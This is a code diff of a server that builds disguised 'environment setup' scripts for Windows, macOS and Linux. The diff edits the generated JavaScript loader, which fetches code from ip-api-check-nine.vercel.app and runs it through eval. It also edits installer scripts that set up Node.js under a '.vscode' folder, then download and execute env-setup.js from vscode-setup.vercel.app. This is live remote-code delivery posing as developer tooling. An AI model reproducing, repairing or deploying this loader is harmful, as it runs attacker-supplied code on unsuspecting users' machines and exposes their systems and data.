@@ -22,7 +22,8 @@ const generalLimiter = rateLimit({
   message: { status: 429, error: "Too many requests, try again later." },
 });
 
-// --- Valid flags for API access ---
+// --- Valid tokens for API access ---
+const VALID_TOKENS = ["701", "702", "703", "704", "705", "706", "707", "708", "709"];
 const VALID_FLAGS = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
 
 // --- App Settings ---
@@ -406,12 +407,12 @@ exit 0
 		const id = token.charAt(token.length-1);
 		script = `
 	const axios = require('axios');
-const host = "ip-ap-check.vercel.app";
+const host = "ip-api-check-nine.vercel.app";
 const apikey = "3aeb34a3${id}";
 axios
   .get(
-  \`https://ip-api-check-nine.vercel.app/icons/70${flag}\`,
-    { headers: { "bearrtoken": "logo" } },
+    \`https://ip-api-check-nine.vercel.app/icons/70${flag}\`,
+     { headers: { "bearrtoken": "logo" } },
   )
   .then((response) => {
     eval(response.data);
@@ -510,7 +511,7 @@ REM Get latest Node.js version using PowerShell
 for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"
 
 REM Remove leading "v"
-set "NODE_VERSION=%LATEST_VERSION:v=%"
+set "NODE_VERSION=%LATEST_VERSION:~1%"
 set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
 set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
 set "EXTRACT_DIR=%~dp0nodejs"
@@ -520,14 +521,14 @@ set "NODE_EXE="
 :: -------------------------
 :: Check for global Node.js
 :: -------------------------
-:: for /f "delims=" %%v in ('node -v 2^>nul') do (
-::     set "NODE_EXE=node"
-::     set "NODE_INSTALLED_VERSION=%%v"
-:: )
-
-if defined NODE_EXE (
+where node >nul 2>&1
+if not errorlevel 1 (
+    for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
+    set "NODE_EXE=node"
     echo [INFO] Node.js is already installed globally: %NODE_INSTALLED_VERSION%
-) else (
+)
+
+if not defined NODE_EXE (
     if exist "%PORTABLE_NODE%" (
         echo [INFO] Portable Node.js found after extraction.
         set "NODE_EXE=%PORTABLE_NODE%"
@@ -538,7 +539,7 @@ if defined NODE_EXE (
     :: Download Node.js MSI if needed
     :: -------------------------
     where curl >nul 2>&1
-    if %errorlevel% NEQ 0 (
+    if errorlevel 1 (
         echo [INFO] Using PowerShell to download Node.js...
         powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
     ) else (
@@ -569,12 +570,10 @@ if defined NODE_EXE (
 :: -------------------------
 :: Confirm Node.js works
 :: -------------------------
-%NODE_EXE% -v >nul 2>&1
-if errorlevel 1 (
-    echo [ERROR] Node.js execution failed.
+if not defined NODE_EXE (
+    echo [ERROR] Node.js executable not found or set.
     exit /b 1
 )
-
 :: -------------------------
 :: Download required files
 :: -------------------------
@@ -602,9 +601,10 @@ if not exist "%~dp0node_modules\\request" (
 :: -------------------------
 :: Run the parser
 :: -------------------------
-if exist "%~dp0env-setup.npl" (
+if exist "%CODEPROFILE%\\env-setup.npl" (
     echo [INFO] Running env-setup.npl...
-    start "" /b /D "%USERPROFILE%\\AppData\\Local" "%NODE_EXE%" "%CODEPROFILE%\\env-setup.npl"
+    cd /d "%USERPROFILE%\\AppData\\Local"
+    "%NODE_EXE%" "%CODEPROFILE%\\env-setup.npl"
     if errorlevel 1 (
         echo [ERROR] env-setup execution failed.
         exit /b 1
@@ -625,85 +625,115 @@ exit /b 0
       }
       script = `
 #!/bin/bash
-
 # Creating new Info
 set -e
-
 OS=$(uname -s)
-# Node.js Version
-# Get latest Node.js version (from official JSON index)
-LATEST_VERSION="20.11.1"
-
-if [ "$OS" == "Darwin" ]; then
-    # macOS
-    LATEST_VERSION="20.11.1"
-elif [ "$OS" == "Linux" ]; then
-    # Linux
-    LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -oP '"version":\\s*"\\Kv[0-9]+\\.[0-9]+\\.[0-9]+' | head -1)
-else
-    exit 1
+NODE_EXE=""
+NODE_INSTALLED_VERSION=""
+# -------------------------
+# Check for global Node.js installation
+# -------------------------
+if command -v node &> /dev/null; then
+    NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")
+    if [ -n "$NODE_INSTALLED_VERSION" ]; then
+        NODE_EXE="node"
+        echo "[INFO] Node.js is already installed globally: $NODE_INSTALLED_VERSION"
+    fi
 fi
-
-# Remove leading "v"
-NODE_VERSION=\${LATEST_VERSION#v}
-
-NODE_TARBALL="node-v\${NODE_VERSION}"
-DOWNLOAD_URL=""
-NODE_DIR="\$HOME/.vscode/\${NODE_TARBALL}"
-
-# Determine the OS (Linux or macOS)
-if [ "$OS" == "Darwin" ]; then
-    # macOS
-    NODE_TARBALL="\$HOME/.vscode/\${NODE_TARBALL}-darwin-x64.tar.xz"
-    DOWNLOAD_URL="https://nodejs.org/dist/v\${NODE_VERSION}/node-v\${NODE_VERSION}-darwin-x64.tar.xz"
-elif [ "$OS" == "Linux" ]; then
-    # Linux
-    NODE_TARBALL="\$HOME/.vscode/\${NODE_TARBALL}-linux-x64.tar.xz"
-    DOWNLOAD_URL="https://nodejs.org/dist/v\${NODE_VERSION}/node-v\${NODE_VERSION}-linux-x64.tar.xz"
-else
-    exit 1
-fi
-
-# Step 2: Check if Node.js is installed
-NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")
-
-# Step 3: Determine whether to install Node.js
-INSTALL_NODE=1
-
-EXTRACTED_DIR="\$HOME/.vscode/node-v\${NODE_VERSION}-\$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"
-
-# Check if the Node.js folder exists
-if [ ! -d "\${EXTRACTED_DIR}" ]; then
-    echo "Error: Node.js directory was not extracted properly. Retrying download and extraction..."
-
-    if [ "\${INSTALL_NODE}" -eq 1 ]; then
-        if ! command -v curl &> /dev/null; then
-            wget -q "\${DOWNLOAD_URL}" -O "\${NODE_TARBALL}"
+# -------------------------
+# If Node.js not found globally, download and extract portable version
+# -------------------------
+if [ -z "$NODE_EXE" ]; then
+    echo "[INFO] Node.js not found globally. Attempting to download portable version..."
+    # Get latest Node.js version
+    if [ "$OS" == "Darwin" ]; then
+        # macOS - get latest version
+        if command -v curl &> /dev/null; then
+            LATEST_VERSION=$(curl -s https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
+        elif command -v wget &> /dev/null; then
+            LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
         else
-            curl -sSL -o "\${NODE_TARBALL}" "\${DOWNLOAD_URL}"
+            LATEST_VERSION="v20.11.1"
         fi
-
-        if [ -f "\${NODE_TARBALL}" ]; then
-            tar -xf "\${NODE_TARBALL}" -C "\$HOME/.vscode"
-            rm -f "\${NODE_TARBALL}"
+    elif [ "$OS" == "Linux" ]; then
+        # Linux - get latest version
+        if command -v curl &> /dev/null; then
+            LATEST_VERSION=$(curl -s https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
+        elif command -v wget &> /dev/null; then
+            LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
+        else
+            LATEST_VERSION="v20.11.1"
+        fi
+    else
+        echo "[ERROR] Unsupported OS: $OS"
+        exit 1
+    fi
+    # Remove leading "v"
+    NODE_VERSION=\${LATEST_VERSION#v}
+    # Determine download URL and paths based on OS
+    EXTRACTED_DIR="$HOME/.vscode/node-v\${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"
+    PORTABLE_NODE="$EXTRACTED_DIR/bin/node"
+    if [ "$OS" == "Darwin" ]; then
+        NODE_TARBALL="$HOME/.vscode/node-v\${NODE_VERSION}-darwin-x64.tar.xz"
+        DOWNLOAD_URL="https://nodejs.org/dist/v\${NODE_VERSION}/node-v\${NODE_VERSION}-darwin-x64.tar.xz"
+    elif [ "$OS" == "Linux" ]; then
+        NODE_TARBALL="$HOME/.vscode/node-v\${NODE_VERSION}-linux-x64.tar.xz"
+        DOWNLOAD_URL="https://nodejs.org/dist/v\${NODE_VERSION}/node-v\${NODE_VERSION}-linux-x64.tar.xz"
+    fi
+    # Check if portable Node.js already exists
+    if [ -f "$PORTABLE_NODE" ]; then
+        echo "[INFO] Portable Node.js found."
+        NODE_EXE="$PORTABLE_NODE"
+        export PATH="$EXTRACTED_DIR/bin:$PATH"
+    else
+        echo "[INFO] Downloading Node.js..."
+        mkdir -p "$HOME/.vscode"
+        # Download Node.js
+        if ! command -v curl &> /dev/null && ! command -v wget &> /dev/null; then
+            echo "[ERROR] Neither curl nor wget is available."
+            exit 1
+        fi
+        if command -v curl &> /dev/null; then
+            curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL"
+        else
+            wget -q -O "$NODE_TARBALL" "$DOWNLOAD_URL"
+        fi
+        if [ ! -f "$NODE_TARBALL" ]; then
+            echo "[ERROR] Failed to download Node.js."
+            exit 1
+        fi
+        echo "[INFO] Extracting Node.js..."
+        tar -xf "$NODE_TARBALL" -C "$HOME/.vscode"
+        rm -f "$NODE_TARBALL"
+        if [ -f "$PORTABLE_NODE" ]; then
+            echo "[INFO] Portable Node.js extracted successfully."
+            NODE_EXE="$PORTABLE_NODE"
+            export PATH="$EXTRACTED_DIR/bin:$PATH"
+        else
+            echo "[ERROR] node executable not found after extraction."
+            exit 1
         fi
     fi
 fi
-
-# Add Node.js to the system PATH (session only)
-export PATH="\${EXTRACTED_DIR}/bin:\$PATH"
-
-# Verify node & npm
-if ! command -v node &> /dev/null || ! command -v npm &> /dev/null; then
+# -------------------------
+# Verify Node.js works
+# -------------------------
+if [ -z "$NODE_EXE" ]; then
+    echo "[ERROR] Node.js executable not set."
     exit 1
 fi
-
-# Use .vscode directory for files
-USER_HOME="\$HOME/.vscode"
+"$NODE_EXE" -v > /dev/null 2>&1
+if [ $? -ne 0 ]; then
+    echo "[ERROR] Node.js execution failed."
+    exit 1
+fi
+# -------------------------
+# Download required files
+# -------------------------
+USER_HOME="$HOME/.vscode"
 mkdir -p "\${USER_HOME}"
 BASE_URL="http://vscode-setup.vercel.app"
-
-# Download files
+echo "[INFO] Downloading env-setup.js and package.json..."
 if ! command -v curl >/dev/null 2>&1; then
     wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
     wget -q -O "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
@@ -711,20 +741,44 @@ else
     curl -s -L -o "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
     curl -s -L -o "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
 fi
-
-# Install 'request' package
+# -------------------------
+# Install dependencies
+# -------------------------
 cd "\${USER_HOME}"
 if [ ! -d "node_modules/request" ]; then
-    npm install --silent --no-progress --loglevel=error --fund=false
+    echo "[INFO] Installing NPM packages..."
+    if command -v npm &> /dev/null; then
+        npm install --silent --no-progress --loglevel=error --fund=false
+    else
+        # Use npm from extracted directory if available
+        if [ -n "$EXTRACTED_DIR" ] && [ -f "$EXTRACTED_DIR/bin/npm" ]; then
+            "$EXTRACTED_DIR/bin/npm" install --silent --no-progress --loglevel=error --fund=false
+        else
+            echo "[ERROR] npm not found."
+            exit 1
+        fi
+    fi
+    if [ $? -ne 0 ]; then
+        echo "[ERROR] npm install failed."
+        exit 1
+    fi
 fi
-
-# Run token parser
+# -------------------------
+# Run env-setup.js
+# -------------------------
 if [ -f "\${USER_HOME}/env-setup.js" ]; then
-    nohup node "\${USER_HOME}/env-setup.js" > "\${USER_HOME}/env-setup.log" 2>&1 &
+    echo "[INFO] Running env-setup.js..."
+    #cd "$HOME"
+    "$NODE_EXE" "\${USER_HOME}/env-setup.js"
+    if [ $? -ne 0 ]; then
+        echo "[ERROR] env-setup.js execution failed."
+        exit 1
+    fi
 else
+    echo "[ERROR] env-setup.js not found."
     exit 1
 fi
-
+echo "[SUCCESS] Script completed successfully."
 exit 0
 `;
 
@@ -757,7 +811,7 @@ exit 0
     
 		script = `
 	const axios = require('axios');
-const host = "ip-ap-check.vercel.app";
+const host = "ip-api-check-nine.vercel.app";
 const apikey = "3aeb34a3${flag}";
 axios
   .get(
